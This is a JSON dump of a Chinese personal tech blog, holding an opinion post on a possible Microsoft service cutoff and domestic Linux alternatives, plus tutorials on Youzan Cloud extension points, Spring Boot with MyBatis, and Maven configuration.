{"meta":{"title":"阿文的博客","subtitle":"记录生活，分享技术","description":"记录生活，分享技术","author":"阿文","url":"https://awen.me","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2021-02-26T06:05:29.238Z","updated":"2021-02-26T06:05:29.238Z","comments":false,"path":"/404.html","permalink":"https://awen.me/404.html","excerpt":"","text":""},{"title":"关于","date":"2021-02-26T06:05:29.361Z","updated":"2021-02-26T06:05:29.361Z","comments":false,"path":"about/index.html","permalink":"https://awen.me/about/index.html","excerpt":"","text":"关于我大家好，我叫阿文，现就职于有赞。同时也是 CSDN 专家作者和讲师，曾在极客学院、CSDN 学院担任过讲师，主讲的《Cisco CCNA 》、《Redis 从入门到精通》、《Redis 面试精讲》 这是我的个人博客，主要记录一些与工作和生活相关的所思所想。 如果有相关合作可以联系: E-mail: hi@awen.me"},{"title":"书单","date":"2021-02-26T06:05:29.361Z","updated":"2021-02-26T06:05:29.361Z","comments":false,"path":"books/index.html","permalink":"https://awen.me/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-02-26T06:05:29.361Z","updated":"2021-02-26T06:05:29.361Z","comments":false,"path":"categories/index.html","permalink":"https://awen.me/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-02-26T06:05:29.364Z","updated":"2021-02-26T06:05:29.364Z","comments":true,"path":"links/index.html","permalink":"https://awen.me/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-02-26T06:05:29.364Z","updated":"2021-02-26T06:05:29.364Z","comments":false,"path":"repository/index.html","permalink":"https://awen.me/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-02-26T06:05:29.365Z","updated":"2021-02-26T06:05:29.365Z","comments":false,"path":"tags/index.html","permalink":"https://awen.me/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"假如微软断供了怎么办？","slug":"假如微软断供了怎么办？","date":"2020-08-11T23:33:15.000Z","updated":"2021-02-26T06:05:29.312Z","comments":true,"path":"posts/62ada41b.html","link":"","permalink":"https://awen.me/posts/62ada41b.html","excerpt":"","text":"新闻网传，微软更新了Microsoft服务协议。根据该协议，如果美国政府对微软下达禁令，微软可能无法继续支持Windows服务，并且不承担因此引发的任何后果，只会尽最大努力避免影响。该事件引发网友热议。 辟谣8月10日上午，微软方面对此回应称，近日某些个别社交媒体对微软服务条款全球性更新的谣言，不符合事实。我们为中国用户提供服务的承诺坚定不移。 笔者随即去阅读了这份争议很大对服务协议，其中确实有“对于因超出微软合理控制范围的情况（例如，劳资纠纷、不可抗力、战争或恐怖主义行为、恶意破坏、意外事故或遵守任何适用法律或政府命令）而导致微软无法履行或延迟履行其义务，微软对此不承担任何责任或义务。微软将尽最大努力降低这些事件的影响，并履行未受影响的义务”等文字表述。 事实上，不仅仅是微软，很多产品的用户协议中都有对不可抗力相关的说明，这也是一种通用条款。因此，大家大可不必担心。 假如微软真的断供我们大胆的假设下微软如果真的”断供“ 对于我们会有多大对影响呢？我们有没有可替代对方案？ 微软的业务分为云和桌面操作系统以及办公软件这三大块，至于移动端，咳咳，咱就不提了。 首先，云计算这一块，国内几乎被阿里云、腾讯云等国内巨头占据了大量对市场份额，2018年IDC 中国云计算市场份额报告中，微软Azure 只占5%，而阿里云占比45.5%、腾讯云占比10.3%。这一块断供对我们影响不大。 但是，如果微软在操作系统这一块对我们实施断供，那么会怎么样，我们来看一组数据，根据 statcounter 机构数据，截至 2019 年 11 月，全球操作系统市场上，Windows 占据了 77.21%的市场份额，OS X 占据了 16.79%的市场份额，Linux 只占据约 1.79%的市场份额。可见微软在桌面端的市场份额和影响力。 同时，微软在office 办公软件的市场份额也非常高，如果这一块断供，受影响最大对将是企业客户。 有替代方案吗？可能有人会说了微软断供，我们有没有替代方案？事实上，在过去和现在，很多国家在过去都曾尝试努力摆脱对微软对依赖，我们来看看： 韩国政府宣布计划将政府及公共机构的操作系统替换为基于Linux的开源操作系统，将于2026年完成。而隔壁的朝鲜早就开始使用自主研发了红星操作系统。 2020年5月，德国慕尼黑政府宣布将放弃Windows系统，逐步开始使用Linux。 2018年，据俄罗斯《消息报》报道，俄罗斯国防部决定将所有办公电脑操作系统改为自主研发的Astra Linux系统。 2020年1月14日,微软正式停止Windows 7、Windows Server 2008等操作系统的更新和支持服务,全球数以亿万计的用户失去了官方支持,而中国用户在其中占比最大,他们的系统将在无防护状态下运行。我们今天在一些场合，例如医院看到医生使用的操作系统还是windows xp， 甚至笔者见过最牛逼对是某电信公司装的操作系统还是windows 98,为什么政府部门不愿升级系统，去采购windows 10 这样的操作系统，因为不安全，也正是这个原因直到 2017 年底，才允许微软与中国电科合资公司修改后发布的「Windows 10神州网信政府版」进入采购目录。Windows 10 神州网信政府版是在 Win10 基础上，根据中国法律法规，针对中国专业领域的需求，定制开发的一个操作系统版本。 因为无法实现自主可控，对于系统的控制权不在我们自己手上，这也是很多国家在去微软化的最大原因。中国工程院院士倪光南就曾表示信息安全问题是个“定时炸弹”，现在很多事件，像乌克兰停电，就是受到攻击以后整个瘫痪了。所以核心技术如果不掌握，我们可能会遭到供应链给人“卡脖子”，还有安全被人“卡脖子”，实际就造成了像棱镜门事件，或者像乌克兰停电，或者伊朗核设施被人攻击破坏这种情况。 同时最近一段时间，随着美国对中国对打压，尤其是对华为的打压，我们国内逐渐意识到了实现技术自主和去美化有多么重要，但是事实上去微软化的路程是非常艰辛和急需要耐心的。 上面说对德国慕尼黑政府宣布将放弃Windows系统，事实上，早在2003 年，受微软终止支持 Windows NT 4.0 的影响，慕尼黑决定抛弃Windows，而使用Linux，但是在2017年最终还是又开始回归了 Windows。这是为啥？因为 Linux 虽然安全可靠、可控，但是生态建设不如windows，普及性和易用性不如Windows，像专业的Photoshop和一些工业软件无法在Linux上使用。 而在国内，倪光南院士曾在公开场合中表示，目前国内一些重要的部门已经率先开启了用国产Linux系统替代国外系统的过程。另外国家税务总局就采购了中兴新支点操作系统，由此可以看出在替换Windows这方面，国家已经有所行动了。 如果Windows真的断供，将是国产软件的重大机遇。 国内已经有不少基于Linux内核研发的操作系统产品，据笔者了解到，以武汉深之度科技有限公司为首的一批国内做操作系统的厂商组建的统信软件，正在打造“中国操作系统创新生态”，目标就是为了解决我国操作系统受制于人的心腹之患。目前来看笔者体验后UOS 和开源的deepin 非常相似，但是UOS会更稳定些，对于普通用户做了些权限限制，比如不能使用root，总体使用上感觉虽然和windows 还存在一定对差距，例如没有原生的微信以及专业对工业级软件，但是简单的办公是没有问题的，其通过Wine 实现的各种windows 平台软件也可以运行，但是体验稍差，生态方面还需要持续建设，目前统信UOS 还在不断在适配各种国产软件，我们目前可以看到例如网易云音乐、wps办公软件、百度网盘、搜狗百度和讯飞输入法等软件的影子，从UOS的适配名单中笔者还看到了大量的国产软件开始适配系统和国产CPU。同时UOS的界面非常的漂亮，有点集windows和mac 的所有有点一样。 对于程序员而言，各种IDE全家桶都是原生的，例如JetBrains全家桶、vscode等大量开源软件，可以说对于程序员而言，使用Linux 是最没有成本和最舒服的。 同时在游戏方面还有steam上各种原生的Linux 游戏，例如巫师3、Dota2、GTA等游戏，体验完全不比windows 下差。 另外悄悄告诉你们，这篇文章笔者就是在manjaro kde 下完成的。现在的Linux 的体验已经不比windows 差了，甚至windows在很多方面有抄袭（借鉴）的意思，比如windows 10 的多桌面。 几年前，我们讨论的是去IOE、即去IBM、Oroce、EMC，现在，我们讨论的是如何实现硬件自主和系统自主，相信在未来，我们一定可以使用上国内的操作系统，但是请你相信，微软是不会放弃中国这么一块巨大的市场的。所以完全不用担心使用不了Windows，这是对于普通人而言，而对于国家而言，自主可控就显得无比重要了。我们不得不承认的一件事情就是在这一块我们还有很长的路要走。任重而道远，我们需要更多的实干家来不断完善生态，而不是打着国产操作系统的牌子行骗或者只是演讲台上的PPT。 如果真有那么一天，你会用国产操作系统吗？欢迎评论区留言。","categories":[],"tags":[]},{"title":"有赞云扩展点使用数据库实现自定义积分扩展点","slug":"有赞云扩展点使用数据库实现自定义积分扩展点","date":"2020-04-21T22:58:32.000Z","updated":"2021-02-26T06:05:29.342Z","comments":true,"path":"posts/f3e5904.html","link":"","permalink":"https://awen.me/posts/f3e5904.html","excerpt":"","text":"如果商家拥有自己的ERP系统或会员系统，希望与有赞云的商城进行打通，那么可以通过使用自用型容器+Mysql 实现将会员的积分信息持久化到独立的数据库中去，有赞云提供了一整套的积分扩展点，包括增加、查询、扣减、消耗积分等扩展点，具体扩展点的用法可以参考文档https://doc.youzanyun.com/doc#/content/EXT/0-3 本文主要针对如何使用积分扩展点以及如何实现与有赞云独立的数据库进行整合进行简单的介绍，本案例中用到的数据库仅为测试使用，且只是为了演示如何使用，不对具体的业务逻辑做具体的实现 操作步骤1.首先，打开clone 下来的工程，根据如图所示的youzanyun-demo-dal位置添加对应的实体类、Mapper、Mapper.xml文件 我这里简单贴下我的代码 对应的mapper UserSourceMapper 1234@Mapperpublic interface UserSourceMapper &#123; int updateUserSource(UserSource userSource);&#125; dataobject 中的usersource 下的UserSource 123456789101112131415161718192021222324252627282930313233343536373839public class UserSource &#123; &#x2F;** * 账号ID *&#x2F; private String accountId; &#x2F;** * 账号类型 *&#x2F; private String accountType; &#x2F;** * 积分值 *&#x2F; private Integer amount; &#x2F;** * 增加积分描述信息 *&#x2F; private String description; &#x2F;** * 业务标识 *&#x2F; private Integer eventType; &#x2F;** * 订单号 *&#x2F; private String bizVlue; &#x2F;** * 操作员 *&#x2F; private String operatorName; &#x2F;** * 扩展信息 *&#x2F; private Map&lt;String,Object&gt; extraInfo; &#x2F;&#x2F;getter 省略 &#x2F;&#x2F;setter 省略 reources 下的mapper 如下 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace&#x3D;&quot;com.youzan.cloud.youzanyun.demo.dal.dao.mapper.UserSourceMapper&quot;&gt; &lt;update id&#x3D;&quot;updateUserSource&quot; parameterType&#x3D;&quot;com.youzan.cloud.youzanyun.demo.dal.dataobject.usersource.UserSource&quot;&gt; UPDATE user_source set amount&#x3D;#&#123;amount&#125;,description&#x3D;#&#123;description&#125;, account_type&#x3D;#&#123;accountType&#125;,biz_vlue&#x3D;#&#123;bizVlue&#125;, operator_name&#x3D;#&#123;operatorName&#125;,event_type&#x3D;#&#123;eventType&#125; WHERE account_id&#x3D;#&#123;accountId&#125; &lt;&#x2F;update&gt;&lt;&#x2F;mapper&gt; 里面对应的数据库表，会在创建数据库时说明，接下来，我们在有赞云控制台的应用管理-配置管理-应用变量中新增如下配置 键 值 说明 mybatis.mapperLocations classpath:mybatis/mapper/*.xml mapper文件路径 mybatis.typeAliasesPackage com.youzan.cloud.youzanyun.demo.dal.dao dao包路径 mybatis.typeAliasesPackage com.youzan.cloud.youzanyun.demo.dal.dataobject 实体类路径 druid.datasource.url jdbc:mysql://10.60.164.192:3306/test?characterEncoding=utf-8 数据连接地址 druid.datasource.password password 密码 druid.datasource.username root 用户名 druid.datasource.driverClassName com.mysql.jdbc.Driver 驱动 然后我们返回工程，我们在如下位置新建一个 IncreasePointsExtPointDemoImpl 积分扩展点实现类，当然你放在自己建的目录中也可以 代码如下 12345678910111213141516171819202122232425262728293031323334@Slf4j@ExtensionService(&quot;increasePointsExtPointDemo&quot;)public class IncreasePointsExtPointDemoImpl implements IncreasePointsExtPoint &#123; @Autowired private UserSourceMapper userSourceMapper; @Override public OutParam&lt;Result&gt; invoke(ExtPointsIncreaseDTO extPointsIncreaseDTO) &#123; log.info(&quot;【北洛-执行扩展点】-增加用户积分 &#123;&#125;&quot;,JSON.toJSONString(extPointsIncreaseDTO)); try &#123; UserSource userSource &#x3D; new UserSource(); userSource.setAccountId(extPointsIncreaseDTO.getExtCustomerInfoDTO().getAccountId()); userSource.setAccountType(extPointsIncreaseDTO.getExtCustomerInfoDTO().getAccountType()); userSource.setAmount(extPointsIncreaseDTO.getAmount()); userSource.setBizVlue(extPointsIncreaseDTO.getBizValue()); userSource.setDescription(extPointsIncreaseDTO.getDescription()); userSource.setEventType(extPointsIncreaseDTO.getEventType()); userSource.setExtraInfo(extPointsIncreaseDTO.getExtraInfo()); userSource.setOperatorName(extPointsIncreaseDTO.getOperatorName()); log.info(userSource.toString()); userSourceMapper.updateUserSource(userSource); return OutParamUtil.successResult(increasePoints(extPointsIncreaseDTO)); &#125; catch (Exception e) &#123; log.error(&quot;增加用户积分异常 &#123;&#125;&quot;, e); return OutParamUtil.failResult(&quot;增加用户积分异常：&quot; + e, new Result()); &#125; &#125; private Result increasePoints(ExtPointsIncreaseDTO extPointsIncreaseDTO) throws SDKException &#123; Long userId &#x3D; Long.valueOf(extPointsIncreaseDTO.getExtCustomerInfoDTO().getAccountId()); Result result &#x3D; new Result(); result.setData(true); return result; &#125;&#125; 接下来，我们需要去数据库配置数据库，在应用管理中的组件管理，新增一个mysql 然后点管理，可以看到你的数据库信息，包括IP 端口 用户名和密码 点击管理控制台，登录phpmyadmin 比如我这里创建的数据库 123456789101112CREATE TABLE &#96;user_source&#96; ( &#96;id&#96; bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT &#39;主键&#39;, &#96;account_id&#96; varchar(128) DEFAULT NULL, &#96;description&#96; varchar(128) DEFAULT NULL, &#96;account_type&#96; varchar(64) DEFAULT NULL, &#96;amount&#96; int(11) NOT NULL, &#96;event_type&#96; int(11) DEFAULT NULL, &#96;biz_vlue&#96; int(11) DEFAULT NULL, &#96;operator_name&#96; varchar(64) NOT NULL, &#96;extra_info&#96; varchar(128) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;)) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;2 DEFAULT CHARSET&#x3D;utf8mb4 然后在里面插入一条数据 1INSERT INTO user_source (account_id, account_type, amount, description, event_type , biz_vlue, operator_name, extra_info) VALUES (&#39;17563168&#39;, &#39;YouZanAccount&#39;, 10, &#39;1&#39;, 100 , &#39;null&#39;, &#39;13148484985&#39;, &#39;null&#39;) 我们将编写好的代码push 到服务器，然后在业务配置-配置管理中的会员中心后端扩展中开启对应的扩展点。因为是测试，不需要配置业务标识 然后在控制台点击发布，在应用管理-发布管理，点击发布，选择服务端发布 发布成功后，我们在对应的微商城中的客户管理里面给上面插入的客户给积分（注意，这个用户的数据我已经提前插入到数据库中，不然是无法更新的 如果发现没有成功，建议在扩展点打一些日志，然后在运维管理-日志管理中查看对应的日志信息，如下所示可以看到已经成功进入扩展点并打了日志 我们可以在数据库中执行 1SELECT * FROM user_source; 可以看到积分已经变成3000了，表示整合mybatis 对数据库进行更新成功了 那么我们知道怎么去实现增加积分，我们也可以照葫芦画瓢的去实现查询和消耗等扩展点 相关问题1.报错 1232020-04-22 07:25:14.032 ERROR 31 --- [DubboServerHandler-10.62.180.70:7200-thread-2] wsc-pc-scrm-0a5b1aad-1587511513395-472276 y.c.y.d.b.IncreasePointsExtPointDemoImpl : 增加用户积分异常 &#123;&#125;org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.youzan.cloud.youzanyun.demo.dal.dao.mapper.UserSourceMapper.updateUserSource 解决，确认你的mybatis.mapperLocations 对应的路径是否正确","categories":[{"name":"有赞云","slug":"有赞云","permalink":"https://awen.me/categories/%E6%9C%89%E8%B5%9E%E4%BA%91/"}],"tags":[{"name":"有赞云","slug":"有赞云","permalink":"https://awen.me/tags/%E6%9C%89%E8%B5%9E%E4%BA%91/"}]},{"title":"SpringBoot整合Mybatis","slug":"SpringBoot整合Mybatis","date":"2020-04-21T01:59:36.000Z","updated":"2021-02-26T06:05:29.266Z","comments":true,"path":"posts/1b5afac3.html","link":"","permalink":"https://awen.me/posts/1b5afac3.html","excerpt":"","text":"在介绍整合Mybatis 前，我们先介绍下如何使用传统的Dao 类方式来实现 首先，配置maven 1234567891011121314151617181920212223242526272829303132333435363738&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jackson-databind&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.47&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;8.0.19&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;&#x2F;artifactId&gt; &lt;version&gt;2.1.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;&#x2F;artifactId&gt; &lt;version&gt;1.1.10&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; 然后我们在application.properties 中进行配置 1234spring.datasource.type&#x3D;com.alibaba.druid.pool.DruidDataSourcespring.datasource.url&#x3D;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;mybatis_db?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf-8spring.datasource.username&#x3D;rootspring.datasource.password&#x3D;123456 接下来我们创建一个User 类 1234567public class User &#123; private Integer id; private String username; private String jobs; private String phone; &#x2F;&#x2F;get &#x2F;&#x2F;set 然后创建一个UserDao 类 1234567891011121314151617181920212223@Repositorypublic class UserDao &#123; @Autowired JdbcTemplate jdbcTemplate; public int addUser(User user)&#123; return jdbcTemplate.update(&quot;INSERT INTO t_user(username,jobs,phone) VALUE (?,?,?)&quot;, user.getName(),user.getJobs(),user.getPhone()); &#125; public int updateUser(User user)&#123; return jdbcTemplate.update(&quot;UPDATE t_user SET username&#x3D;?,jobs&#x3D;?,phone&#x3D;? WHERE id&#x3D;?&quot;, user.getName(),user.getJobs(),user.getPhone(),user.getId()); &#125; public int deleteUser(Integer id)&#123; return jdbcTemplate.update(&quot;DELETE FROM t_user WHERE id&#x3D;?&quot;,id); &#125; public User getUserById(Integer id)&#123; return jdbcTemplate.queryForObject(&quot;SELECT * FROM t_user WHERE id &#x3D;?&quot;,new BeanPropertyRowMapper&lt;&gt;(User.class),id); &#125; public List&lt;User&gt; getAllUser()&#123; return jdbcTemplate.query(&quot;SELECT * FROM t_user&quot;,new BeanPropertyRowMapper&lt;&gt;(User.class)); &#125;&#125; 接下来创建一个UserService 类 123456789101112131415161718192021@Servicepublic class UserService &#123; @Autowired UserDao userDao; public int addUser(User user)&#123; return userDao.addUser(user); &#125; public int updateUser(User user)&#123; return userDao.updateUser(user); &#125; public int deleteUser(Integer id)&#123; return userDao.deleteUser(id); &#125; public User getUserById(Integer id)&#123; return userDao.getUserById(id); &#125; public List&lt;User&gt; getAllUser()&#123; return userDao.getAllUser(); &#125;&#125; 最后是UserController类 12345678910111213141516@RestControllerpublic class UserController &#123; @Autowired UserService userService; @GetMapping(&quot;&#x2F;user&quot;) public void UserOps()&#123; User u1 &#x3D; new User(); u1.setName(&quot;章三三&quot;); u1.setJobs(&quot;程序员&quot;); u1.setPhone(&quot;131444224433&quot;); int i &#x3D; userService.addUser(u1); System.out.println(i); List&lt;User&gt; allUser &#x3D; userService.getAllUser(); System.out.println(allUser); &#125;&#125; 我们运行程序，然后访问127.0.0.1:8080/user 我们看到IDE 控制台输出了如下内容 访问数据库，我们查询后结果如下 这是传统Dao 方式的整合，接下来，我们讲下使用Mybatis 整合 首先，在pom.xml 中增加 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;&#x2F;artifactId&gt; &lt;version&gt;2.1.2&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 然后创建一个Mapper 文件夹，在该文件夹下创建一个UserMapper 接口 123456789@Mapperpublic interface UserMapper &#123; int addUser(User user); int deleteUser(int id); int updateUser(User user); User getUserById(Integer id); List&lt;User&gt; getAllUsers();&#125; 接下来，在resource下创建一个Mapper 文件夹，然后在文件夹中创建一个UserMapper.xml 123456789101112131415161718192021&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace&#x3D;&quot;com.example.demo.Mapper.UserMapper&quot;&gt; &lt;insert id&#x3D;&quot;addUser&quot; parameterType&#x3D;&quot;com.example.demo.Bean.User&quot;&gt; INSERT INTO t_user(username,jobs,phone) VALUE (#&#123;username&#125;,#&#123;jobs&#125;,#&#123;phone&#125;) &lt;&#x2F;insert&gt; &lt;delete id&#x3D;&quot;deleteUser&quot; parameterType&#x3D;&quot;int&quot;&gt; DELETE FROM t_user WHERE id&#x3D;#&#123;id&#125; &lt;&#x2F;delete&gt; &lt;update id&#x3D;&quot;updateUser&quot; parameterType&#x3D;&quot;com.example.demo.Bean.User&quot;&gt; UPDATE t_user set username&#x3D;#&#123;username&#125;,jobs&#x3D;#&#123;jobs&#125;,phone&#x3D;#&#123;phone&#125; WHERE id&#x3D;#&#123;id&#125; &lt;&#x2F;update&gt; &lt;select id&#x3D;&quot;getUserById&quot; parameterType&#x3D;&quot;int&quot; resultType&#x3D;&quot;com.example.demo.Bean.User&quot;&gt; SELECT * FROM t_user WHEN id&#x3D;#&#123;id&#125; &lt;&#x2F;select&gt; &lt;select id&#x3D;&quot;getAllUsers&quot; resultType&#x3D;&quot;com.example.demo.Bean.User&quot;&gt; SELECT * FROM t_user &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; 然后对之前的UserService 类进行改造 123456789101112131415161718192021@Servicepublic class UserService &#123; @Autowired UserMapper userMapper; public int addUser(User user)&#123; return userMapper.addUser(user); &#125; public int updateUser(User user)&#123; return userMapper.updateUser(user); &#125; public int deleteUser(Integer id)&#123; return userMapper.deleteUser(id); &#125; public User getUserById(Integer id)&#123; return userMapper.getUserById(id); &#125; public List&lt;User&gt; getAllUser()&#123; return userMapper.getAllUsers(); &#125;&#125; 然后我们在application.properties中添加mybatis 的配置 12mybatis.typeAliasesPackage&#x3D;com.example.demo.Mappermybatis.mapperLocations&#x3D;classpath:Mapper&#x2F;*.xml 最后，我们修改下UserController 12345678910111213141516@RestControllerpublic class UserController &#123; @Autowired UserService userService; @GetMapping(&quot;&#x2F;user&quot;) public void UserOps()&#123; User u1 &#x3D; new User(); u1.setName(&quot;李思思&quot;); u1.setJobs(&quot;美工&quot;); u1.setPhone(&quot;131444224443&quot;); int i &#x3D; userService.addUser(u1); System.out.println(i); List&lt;User&gt; allUser &#x3D; userService.getAllUser(); System.out.println(allUser); &#125;&#125; 运行程序，我们访问结果如下 查询数据库 整个工程的目录结构如下","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/categories/SpringBoot/"}],"tags":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/tags/SpringBoot/"}]},{"title":"如何使用有赞云的扩展点实现自己的业务逻辑","slug":"如何使用有赞云的扩展点实现自己的业务逻辑","date":"2020-04-18T11:46:28.000Z","updated":"2021-02-26T06:05:29.324Z","comments":true,"path":"posts/3040ba35.html","link":"","permalink":"https://awen.me/posts/3040ba35.html","excerpt":"","text":"很多用户在购买了有赞的微商城之后，在使用过程中发现有赞默认提供的标准化接口不能够满足自己的实际需求，事实上，不同的行业都会有一些自己行业的流程，比如说电子卡券，用户下单购买电子卡券，默认有赞这边会调用电子卡券创建接口生成卡券信息返回给用户，但是处于用户信息安全考虑这个卡券信息商家自己是看不到的，那么商家希望针对电子卡券实现定制化开发使用标准的接口就行不通了，打个比方，商家希望实现一个电子卡券增送给用户的功能，可以将卡券信息写到一张图片后通过微信分享给好友，那么通过有赞默认提供的电子卡券功能就无法实现，那么商家希望拿到电子卡券的信息就只能自己去定制化开发，这个时候就需要使用到有赞云的有容器服务开通扩展点实现对创建电子卡券接口的定制化开发。 那么本文就针对创建电子卡券的这个流程进行讲解如何去使用扩展点实现这一功能。 准备工作首先，要使用扩展点，你必须具备以下条件： 拥有有赞微商城、有赞零售的对应店铺，且店铺未过期 拥有有赞云创建有容器的条件，需要通过审核 克隆项目这里假设你已经创建了自用型容器，我们从首页进入到该容器中，将项目克隆到本地 切换到git 仓库信息，复制仓库地址，然后在克隆的时候填写username 和password，username就是你注册平的手机号，password 就是Gittoken 配置maven克隆后先不要着急 import 项目，我们先配置下Maven的setting.xml文件，你可以复制我下面的,我这里使用的maven 版本是apache-maven-3.6.3 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;settings xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;SETTINGS&#x2F;1.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;SETTINGS&#x2F;1.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;settings-1.0.0.xsd&quot;&gt; &lt;pluginGroups&gt; &lt;&#x2F;pluginGroups&gt; &lt;proxies&gt; &lt;&#x2F;proxies&gt; &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;&#x2F;id&gt; &lt;name&gt;aliyun maven&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt; &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt; &lt;&#x2F;mirror&gt; &lt;&#x2F;mirrors&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;dev&lt;&#x2F;id&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;youzanyun-releases&lt;&#x2F;id&gt; &lt;name&gt;Nexus Release Repository&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.youzanyun.com&#x2F;repository&#x2F;maven-releases&#x2F;&lt;&#x2F;url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt; &lt;&#x2F;releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;&#x2F;enabled&gt; &lt;&#x2F;snapshots&gt; &lt;&#x2F;repository&gt; &lt;repository&gt; &lt;id&gt;youzanyun-snapshots&lt;&#x2F;id&gt; &lt;name&gt;Nexus Snapshot Repository&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.youzanyun.com&#x2F;repository&#x2F;maven-snapshots&#x2F;&lt;&#x2F;url&gt; &lt;releases&gt; &lt;enabled&gt;false&lt;&#x2F;enabled&gt; &lt;&#x2F;releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt; &lt;&#x2F;snapshots&gt; &lt;&#x2F;repository&gt; &lt;repository&gt; &lt;id&gt;spring&lt;&#x2F;id&gt; &lt;url&gt;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;spring&lt;&#x2F;url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt; &lt;&#x2F;releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt; &lt;&#x2F;snapshots&gt; &lt;&#x2F;repository&gt; &lt;&#x2F;repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;youzanyun-plugin&lt;&#x2F;id&gt; &lt;name&gt;youzanyun repository&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.youzanyun.com&#x2F;repository&#x2F;maven-releases&#x2F;&lt;&#x2F;url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt; &lt;&#x2F;releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;&#x2F;enabled&gt; &lt;&#x2F;snapshots&gt; &lt;&#x2F;pluginRepository&gt; &lt;&#x2F;pluginRepositories&gt; &lt;&#x2F;profile&gt; &lt;&#x2F;profiles&gt; &lt;activeProfiles&gt; &lt;activeProfile&gt;dev&lt;&#x2F;activeProfile&gt; &lt;&#x2F;activeProfiles&gt; 